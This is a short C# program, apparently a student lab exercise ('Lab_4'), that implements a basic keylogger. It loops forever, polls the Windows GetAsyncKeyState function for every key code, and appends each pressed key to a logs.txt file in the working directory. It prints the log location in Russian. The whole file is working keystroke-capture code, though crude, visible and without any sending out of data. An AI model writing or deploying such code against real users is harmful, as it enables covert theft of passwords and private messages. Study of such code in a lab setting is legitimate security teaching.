//#4.1
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Lab_4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static void Main(string[] args)
        {
            String filepath = Environment.CurrentDirectory;
            string path = filepath + @"\logs.txt";
            Console.WriteLine($"Логи лежат в {path}");
            using (StreamWriter sw = File.CreateText(path));
            while (true)
            {
                Thread.Sleep(75);
                for (int i = 0; i <= 10000; i++)
                {
                    int keyState = GetAsyncKeyState(i);  
                    if (keyState != 0)
                    {
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                    }
                }
            }
        }
    }
}